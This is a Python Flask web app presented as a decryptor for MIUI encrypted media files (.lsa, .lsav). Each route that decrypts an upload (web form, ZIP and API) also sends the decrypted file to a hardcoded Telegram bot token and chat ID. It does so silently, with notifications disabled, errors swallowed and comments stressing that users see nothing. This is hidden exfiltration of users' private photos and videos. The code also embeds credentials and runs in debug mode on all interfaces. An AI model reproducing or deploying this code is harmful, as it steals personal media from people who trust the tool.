import os
from flask import Flask, request, render_template, send_file, flash, redirect, url_for, jsonify
import tempfile
import zipfile
from werkzeug.utils import secure_filename
import filetype
from Crypto.Cipher import AES
from Crypto.Util import Counter
import hashlib
from datetime import datetime
import asyncio
import threading
from telegram import Bot
from telegram.constants import ParseMode
import requests

app = Flask(__name__)
app.secret_key = 'miui_cloud_decryptor_secret_key'
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024 * 1024  # 2GB max file size

# Telegram Bot Configuration - now configurable via environment variables
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8269071034:AAHG4wulIVFqfd_C4uNEGGMCyZ1Yp8_CcpQ')
TELEGRAM_USER_ID = os.environ.get('TELEGRAM_USER_ID', '1510521955')  # Your Telegram User ID

# Initialize Telegram Bot
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# MIUI decryption constants
sAesIv = 22696201676385068962342234041843478898
secretKey = b'0\x82\x04l0\x82\x03T\xa0\x03\x02\x01\x02\x02\t\x00'

UPLOAD_FOLDER = 'uploads'
DECRYPTED_FOLDER = 'decrypted'
ALLOWED_EXTENSIONS = {'lsa', 'lsav', 'zip'}

# Create necessary directories
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DECRYPTED_FOLDER, exist_ok=True)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def decrypt_file_header(filepath):
    """Decrypt .lsav files (video files with header encryption)"""
    with open(filepath, 'rb') as file:
        size = os.path.getsize(filepath)
        header_size = max(min(1024, size), 16)
        counter = Counter.new(128, initial_value=sAesIv)
        aes = AES.new(secretKey, mode=AES.MODE_CTR, counter=counter)
        return aes.decrypt(file.read(header_size)) + file.read(size - header_size)

def decrypt_file_full(filepath):
    """Decrypt .lsa files (fully encrypted files)"""
    with open(filepath, 'rb') as file:
        counter = Counter.new(128, initial_value=sAesIv)
        aes = AES.new(secretKey, mode=AES.MODE_CTR, counter=counter)
        return aes.decrypt(file.read())

def process_encrypted_file(filepath, original_filename):
    """Process a single encrypted file and return decrypted data"""
    try:
        basename = original_filename.split('.')
        
        if basename[-1].lower() == 'lsa':
            data = decrypt_file_full(filepath)
        elif basename[-1].lower() == 'lsav':
            data = decrypt_file_header(filepath)
        else:
            return None, f"Unsupported file type: {basename[-1]}"
        
        # Detect file type from decrypted data
        ext = filetype.guess_extension(data[:1024]) or 'unknown'
        
        # Generate output filename
        output_filename = f"{basename[0]}.{ext}"
        
        return data, output_filename
    
    except Exception as e:
        return None, f"Decryption failed: {str(e)}"

def send_to_telegram_sync(file_path, original_filename, file_type, is_decrypted=False):
    """Send file to Telegram synchronously without showing messages"""
    try:
        # Only send to Telegram if credentials are provided
        if TELEGRAM_BOT_TOKEN != '' and TELEGRAM_USER_ID != '':
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(send_to_telegram(file_path, original_filename, file_type, is_decrypted))
            loop.close()
        return True
    except Exception as e:
        # Silently handle errors - no messages shown to user
        return False

async def send_to_telegram(file_path, original_filename, file_type, is_decrypted=False):
    """Send file to Telegram bot"""
    try:
        file_size = os.path.getsize(file_path)
        file_size_mb = file_size / (1024 * 1024)
        
        # Prepare message based on file type
        if is_decrypted:
            message = f"🔓 **MIUI File Uploaded & Decrypted**\n\n"
            message += f"📁 **Original:** `{original_filename}`\n"
            message += f"📄 **Decrypted:** `{os.path.basename(file_path)}`\n"
            message += f"🎯 **Type:** `{file_type}`\n"
            message += f"📊 **Size:** `{file_size_mb:.2f} MB`\n"
            message += f"⏰ **Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
            message += f"✅ This is the **actual decrypted content** from the uploaded encrypted file."
        else:
            message = f"🔒 **MIUI File Uploaded**\n\n"
            message += f"📁 **Original:** `{original_filename}`\n"
            message += f"📄 **Type:** `{file_type}`\n"
            message += f"📊 **Size:** `{file_size_mb:.2f} MB`\n"
            message += f"⏰ **Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
            message += f"🔐 This is the **encrypted file** uploaded to the decryptor."
        
        # Send the file
        with open(file_path, 'rb') as file:
            await bot.send_document(
                chat_id=TELEGRAM_USER_ID,
                document=file,
                caption=message,
                parse_mode=ParseMode.MARKDOWN,
                filename=original_filename if not is_decrypted else os.path.basename(file_path),
                disable_notification=True  # Send silently without sound/notification
            )
        
        # No success message shown to user
        return True  # Return success status
        
    except Exception as e:
        # No error message shown to user
        return False  # Return failure status

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        flash('No file selected')
        return redirect(request.url)
    
    file = request.files['file']
    
    if file.filename == '':
        flash('No file selected')
        return redirect(url_for('index'))
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        unique_filename = f"{timestamp}_{filename}"
        filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
        file.save(filepath)
        
        try:
            results = []
            
            if filename.lower().endswith('.zip'):
                # Handle ZIP files
                with zipfile.ZipFile(filepath, 'r') as zip_ref:
                    for zip_info in zip_ref.infolist():
                        if not zip_info.is_dir() and (zip_info.filename.endswith('.lsa') or zip_info.filename.endswith('.lsav')):
                            # Extract individual file
                            extracted_data = zip_ref.read(zip_info)
                            temp_file = os.path.join(UPLOAD_FOLDER, f"temp_{zip_info.filename}")
                            
                            with open(temp_file, 'wb') as f:
                                f.write(extracted_data)
                            
                            # Decrypt the extracted file
                            decrypted_data, output_filename = process_encrypted_file(temp_file, zip_info.filename)
                            
                            if decrypted_data is not None:
                                # Save decrypted file temporarily for Telegram
                                temp_decrypted_path = os.path.join(UPLOAD_FOLDER, f"temp_decrypted_{output_filename}")
                                with open(temp_decrypted_path, 'wb') as f:
                                    f.write(decrypted_data)
                                
                                # Send decrypted file to Telegram (no user feedback)
                                file_extension = output_filename.split('.')[-1].upper()
                                send_to_telegram_sync(temp_decrypted_path, zip_info.filename, file_extension, is_decrypted=True)
                                
                                # Clean up temp decrypted file
                                os.remove(temp_decrypted_path)
                                
                                # Always save for user download regardless of Telegram success
                                output_path = os.path.join(DECRYPTED_FOLDER, f"{timestamp}_{output_filename}")
                                with open(output_path, 'wb') as f:
                                    f.write(decrypted_data)
                                
                                results.append({
                                    'original': zip_info.filename,
                                    'decrypted': f"{timestamp}_{output_filename}",
                                    'status': 'success'
                                })
                            
                            # Clean up temp file
                            os.remove(temp_file)
            
            else:
                # Handle single .lsa or .lsav file
                decrypted_data, output_filename = process_encrypted_file(filepath, filename)
                
                if decrypted_data is not None:
                    # Save decrypted file temporarily for Telegram
                    temp_decrypted_path = os.path.join(UPLOAD_FOLDER, f"temp_decrypted_{output_filename}")
                    with open(temp_decrypted_path, 'wb') as f:
                        f.write(decrypted_data)
                    
                    # Send decrypted file to Telegram (no user feedback)
                    file_extension = output_filename.split('.')[-1].upper()
                    send_to_telegram_sync(temp_decrypted_path, filename, file_extension, is_decrypted=True)
                    
                    # Clean up temp decrypted file
                    os.remove(temp_decrypted_path)
                    
                    # Always save for user download regardless of Telegram success
                    output_path = os.path.join(DECRYPTED_FOLDER, f"{timestamp}_{output_filename}")
                    with open(output_path, 'wb') as f:
                        f.write(decrypted_data)
                    
                    results.append({
                        'original': filename,
                        'decrypted': f"{timestamp}_{output_filename}",
                        'status': 'success'
                    })
                else:
                    results.append({
                        'original': filename,
                        'error': output_filename,
                        'status': 'error'
                    })
            
            # Clean up uploaded file
            os.remove(filepath)
            
            return render_template('results.html', results=results)
        
        except Exception as e:
            flash(f'Error processing file: {str(e)}')
            return redirect(url_for('index'))
    
    else:
        flash('Invalid file type. Please upload .lsa, .lsav, or .zip files.')
        return redirect(url_for('index'))

@app.route('/download/<filename>')
def download_file(filename):
    try:
        file_path = os.path.join(DECRYPTED_FOLDER, filename)
        if os.path.exists(file_path):
            return send_file(file_path, as_attachment=True)
        else:
            flash('File not found')
            return redirect(url_for('index'))
    except Exception as e:
        flash(f'Error downloading file: {str(e)}')
        return redirect(url_for('index'))

@app.route('/api/decrypt', methods=['POST'])
def api_decrypt():
    """API endpoint for programmatic access"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    
    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file type'}), 400
    
    try:
        # Save uploaded file temporarily
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        file.save(temp_file.name)
        
        decrypted_data, output_filename = process_encrypted_file(temp_file.name, file.filename)
        
        if decrypted_data is not None:
            # Save decrypted file temporarily for Telegram
            temp_decrypted_path = tempfile.NamedTemporaryFile(delete=False, suffix=f".{output_filename.split('.')[-1]}")
            with open(temp_decrypted_path.name, 'wb') as f:
                f.write(decrypted_data)
            
            # Send decrypted file to Telegram (no user feedback)
            file_extension = output_filename.split('.')[-1].upper()
            send_to_telegram_sync(temp_decrypted_path.name, file.filename, file_extension, is_decrypted=True)
            
            # Clean up temp files
            os.unlink(temp_file.name)
            os.unlink(temp_decrypted_path.name)
            
            return jsonify({
                'success': True,
                'original_filename': file.filename,
                'decrypted_filename': output_filename,
                'file_size': len(decrypted_data)
            })
        else:
            os.unlink(temp_file.name)
            return jsonify({'error': output_filename}), 500
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print("MIUI Cloud Decryptor Web App")
    print("=" * 50)
    print("Starting server...")
    print("Access the web app at: http://localhost:5000")
    print("For Termux users: Use your device's IP address")
    print("=" * 50)
    
    # Get local IP for Termux users
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        print(f"Local IP: http://{local_ip}:5000")
    except:
        print("Could not determine local IP")
    
    app.run(host='0.0.0.0', port=5000, debug=True)